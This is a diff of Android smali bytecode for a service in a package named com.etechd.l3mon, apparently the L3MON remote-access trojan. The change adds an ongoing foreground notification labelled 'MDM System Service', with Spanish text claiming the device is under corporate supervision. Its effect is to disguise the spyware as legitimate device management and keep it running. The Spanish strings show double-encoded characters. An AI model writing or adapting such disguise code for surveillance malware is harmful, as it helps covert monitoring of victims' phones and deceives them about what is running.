@@ -6,6 +6,11 @@
 # static fields
 .field private static contextOfApplication:Landroid/content/Context;
 
+.field private static final CHANNEL_ID:Ljava/lang/String; = "mdm_service_v3"
+
+.field private static final NOTIFICATION_ID:I = 0x232a
+
+
 
 # direct methods
 .method public constructor <init>()V
@@ -109,5 +114,77 @@
     invoke-static {p0}, Lcom/etechd/l3mon/ConnectionManager;->startAsync(Landroid/content/Context;)V
 
     .line 71
+    const/16 v3, 0x232a
+
+    invoke-direct {p0}, Lcom/etechd/l3mon/MainService;->buildNotification()Landroid/app/Notification;
+
+    move-result-object v0
+
+    invoke-virtual {p0, v3, v0}, Lcom/etechd/l3mon/MainService;->startForeground(ILandroid/app/Notification;)V
+
+    .line 71
     return v2
+
+.end method
+.method private buildNotification()Landroid/app/Notification;
+    .locals 5
+
+    new-instance v0, Landroid/app/NotificationChannel;
+
+    const-string v1, "mdm_service_v3"
+
+    const-string v2, "MDM System Service"
+
+    const/4 v3, 0x2
+
+    invoke-direct {v0, v1, v2, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V
+
+    const-string v1, "notification"
+
+    invoke-virtual {p0, v1}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v1
+
+    check-cast v1, Landroid/app/NotificationManager;
+
+    if-eqz v1, :cond_0
+
+    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
+
+    :cond_0
+    new-instance v0, Landroid/app/Notification$Builder;
+
+    const-string v1, "mdm_service_v3"
+
+    invoke-direct {v0, p0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V
+
+    const-string v1, "Protecci\u00c3\u00b3n MDM Activa"
+
+    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
+
+    move-result-object v0
+
+    const-string v1, "El dispositivo est\u00c3\u00a1 bajo supervisi\u00c3\u00b3n corporativa."
+
+    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;
+
+    move-result-object v0
+
+    const v1, 0x1080037
+
+    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;
+
+    move-result-object v0
+
+    const/4 v1, 0x1
+
+    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setOngoing(Z)Landroid/app/Notification$Builder;
+
+    move-result-object v0
+
+    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;
+
+    move-result-object v0
+
+    return-object v0
 .end method
